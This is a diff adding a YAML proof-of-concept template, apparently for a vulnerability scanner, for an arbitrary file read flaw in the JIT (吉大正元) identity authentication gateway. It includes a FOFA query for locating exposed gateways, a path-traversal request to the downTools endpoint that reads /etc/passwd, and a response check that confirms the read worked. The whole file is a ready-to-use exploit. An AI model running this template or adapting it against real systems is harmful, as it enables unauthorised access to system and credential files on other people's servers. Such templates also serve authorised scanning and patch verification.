@@ -1,0 +1,15 @@
+id: poc-yaml-jit-downtools-anyfile-read
+info:
+  name: 吉大正元身份认证网关 downTools 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 吉大正元身份认证网关
+  fofa: title="吉大正元身份认证网关"
+requests:
+- method: GET
+  path: /jit_pnx_portal/downTools?fileName=../../../../../../../../../etc/passwd
+  expression: status_code == 200 && contains(body,"root:") && contains(body,"/bin")
+    && contains(headers,"filename=") && !contains(body,"<")
+variables: {}
+transport: http
